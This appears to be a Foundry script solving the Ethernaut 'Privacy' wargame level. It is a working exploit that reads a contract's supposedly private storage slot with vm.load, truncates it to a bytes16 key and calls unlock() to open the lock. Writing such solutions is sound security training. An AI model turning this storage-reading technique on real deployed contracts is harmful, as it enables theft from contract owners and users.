// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script, console2} from "forge-std/Script.sol";
import {IPrivacy} from "../src/interfaces/IPrivacy.sol";

contract PrivacyScript is Script {
    function run() external {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        address instance = vm.envAddress("INSTANCE_ADDRESS");

        IPrivacy target = IPrivacy(instance);

        bool lockedBefore = target.locked();

        console2.log("--- Privacy Exploit ---");
        console2.log("Target Instance:", instance);
        console2.log("Locked Before  :", lockedBefore);

        if (!lockedBefore) {
            console2.log("Privacy is already unlocked! Submit instance in Ethernaut.");
            return;
        }

        // Storage Layout:
        // Slot 0: bool locked
        // Slot 1: uint256 ID
        // Slot 2: uint8 flattening + uint8 denomination + uint16 awkwardness (packed)
        // Slot 3: data[0]
        // Slot 4: data[1]
        // Slot 5: data[2]
        bytes32 slot5 = vm.load(instance, bytes32(uint256(5)));
        bytes16 key = bytes16(slot5);

        console2.log("Slot 5 raw value:");
        console2.logBytes32(slot5);
        console2.log("Extracted bytes16 key:");
        console2.logBytes16(key);

        vm.startBroadcast(privateKey);

        target.unlock(key);

        vm.stopBroadcast();

        bool lockedAfter = target.locked();
        console2.log("Locked After   :", lockedAfter);
        require(!lockedAfter, "Exploit failed: Privacy is still locked");
        console2.log(">>> SUCCESS! Privacy unlocked! Submit instance in Ethernaut. <<<");
    }
}
